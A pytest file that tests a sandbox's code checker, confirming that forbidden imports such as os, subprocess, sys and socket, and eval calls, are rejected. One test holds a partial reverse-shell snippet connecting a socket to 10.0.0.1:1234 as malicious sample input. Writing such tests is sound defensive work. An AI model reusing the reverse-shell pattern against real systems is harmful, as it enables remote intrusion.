import os
import sys

import pytest

# Add worker directory to sys.path to import SecurityChecker
sys.path.append(os.path.join(os.path.dirname(__file__), "../../../worker"))

from security import SecurityChecker, SecurityViolation  # noqa: E402


def test_security_check_valid_code():
    checker = SecurityChecker()
    code = """
def add(a, b):
    return a + b
print(add(1, 2))
"""
    # Should not raise exception
    checker.check_code(code)


def test_security_check_header_forbidden_import():
    checker = SecurityChecker()
    with pytest.raises(
        SecurityViolation, match="보안 위반이 감지되었습니다: 금지된 모듈 임포트: os"
    ):
        checker.check_code("import os")


def test_security_check_forbidden_import_from():
    checker = SecurityChecker()
    # Unused variable removed
    with pytest.raises(SecurityViolation, match="금지된 모듈에서 임포트: subprocess"):
        checker.check_code("from subprocess import call")


def test_security_check_forbidden_function_call():
    checker = SecurityChecker()
    # Unused variable removed
    with pytest.raises(SecurityViolation, match="금지된 함수 호출: eval"):
        checker.check_code("eval('print(1)')")


def test_security_check_complex_malicious_code():
    checker = SecurityChecker()
    code = """
import sys
import socket

def reverse_shell():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect(("10.0.0.1", 1234))
"""
    with pytest.raises(SecurityViolation) as excinfo:
        checker.check_code(code)

    assert "금지된 모듈 임포트: sys" in str(excinfo.value)
    assert "금지된 모듈 임포트: socket" in str(excinfo.value)
